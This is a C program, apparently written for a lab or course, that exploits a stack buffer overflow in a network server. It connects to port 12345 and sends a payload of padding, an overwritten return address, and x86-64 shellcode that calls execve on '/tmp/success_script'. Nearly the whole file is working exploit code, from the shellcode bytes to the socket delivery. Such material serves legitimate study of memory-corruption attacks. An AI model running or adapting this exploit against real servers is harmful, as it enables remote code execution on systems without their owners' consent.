#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <inttypes.h>


unsigned char shellcode[] =
   	"\x48\x31\xc0"                              // xor    %rax,%rax
	"\x48\xc7\xc0\x69\x70\x74\x00"              // mov    $0x747069,%rax
	"\x50"                                      // push   %rax
	"\x48\xb8\x63\x65\x73\x73\x5f"				// movabs $0x7263735f73736563,%rax
	"\x73\x63\x72"
    "\x50"                                      // push   %rax
	"\x48\xb8\x2f\x74\x6d\x70\x2f"              // movabs $0x6375732f706d742f,%rax
	"\x73\x75\x63"
    "\x50"                                      // push   %rax
	"\x48\x89\xe7"                              // mov    %rsp,%rdi
	"\x48\xc7\xc0\x35\x00\x00\x00"              // mov    $0x35,%rax
	"\x50"                                      // push   %rax
	"\x48\xb8\x32\x30\x37\x39\x34"              // movabs $0x3832323439373032,%rax
	"\x32\x32\x38"
    "\x50"                                      // push   %rax
	"\x48\x89\xe2"                              // mov    %rsp,%rdx
	"\x48\x31\xc0"                              // xor    %rax,%rax
	"\x50"                                      // push   %rax
	"\x52"                                      // push   %rdx
	"\x57"                                      // push   %rdi
	"\x48\x89\xe6"                              // mov    %rsp,%rsi
	"\x48\x31\xd2"                              // xor    %rdx,%rdx
	"\x48\xc7\xc0\x3b\x00\x00\x00"              // mov    $0x3b,%rax

    "\x0f\x05";                                 // syscall

#define SHELLCODE_BIN_LEN sizeof(shellcode) // Length of shellcode

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <server-ip-address> <address-of-x> <x-offset-from-return-address>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Step 1: Parse command-line arguments
    const char *server_ip = argv[1];

    uint64_t address_of_x = strtoul(argv[2], NULL, 16); // Convert hex string to unsigned long
    uint64_t offset_to_return = atoi(argv[3]);  // Offset from x to the return address
    int sockfd;
    struct sockaddr_in server_addr;

    // Step 2: Create socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 3: Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(12345); // Server port
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address or address not supported");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Step 4: Connect to the server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Step 5: Craft the payload
    // Use the offset directly as the buffer size
    uint64_t payload_size = 1024; // buffer + RBP + shellcode +some extra place
    unsigned char *payload = malloc(payload_size);
    if (!payload) {
        perror("Failed to allocate memory for payload");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    // the shellcode starting adress
    uint64_t shellcode_address = address_of_x+offset_to_return + 8;

    memset(payload, 'A', offset_to_return); // fill until the ofset with A

    memcpy(payload + offset_to_return,&shellcode_address
           , 8); // overwrite the return adress to run the shellcode


    memcpy(payload + offset_to_return + 8
               , &shellcode, SHELLCODE_BIN_LEN);     // Add shellcode

    // Step 6: Send the payload
    if (send(sockfd, payload, payload_size, 0) < 0) {
        perror("Failed to send payload");
        free(payload);
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Payload sent! Check the server's behavior.\n");

    // Step 7: Clean up
    free(payload);
    close(sockfd);
    return 0;
}